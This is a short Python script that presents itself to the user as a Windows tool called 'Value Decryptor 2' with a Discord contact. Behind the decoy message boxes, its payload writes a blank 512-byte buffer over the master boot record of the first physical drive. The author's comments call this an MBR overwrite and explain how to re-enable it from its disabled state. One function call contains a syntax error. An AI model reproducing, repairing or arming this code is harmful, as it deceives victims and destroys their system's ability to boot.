#pip install pywin32
from win32gui import *
from win32ui import *
from win32con import *
from win32file import *

def main():
    if MessageBox("This version of Value Decryptor 2 is only supported on Windows, please confirm that you are running this on a windows device.", "Value Decryptor 2", MB_ICONWARNING | MB_YESNO) == 7:
        return
    if MessageBox("If you have any issues, please DM poggersbutnot#4543", "Value Decryptor 2" MB_ICONWARNING | MB_YESNO) == 7:
        return
    if False: #set to false in case of accidents | set to true for mbr overwrite to proceed
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
        WriteFile(hDevice, AllocateReadBuffer(512), None)
        CloseHandle(hDevice)

#main() #extra protection in case of accident, remove #
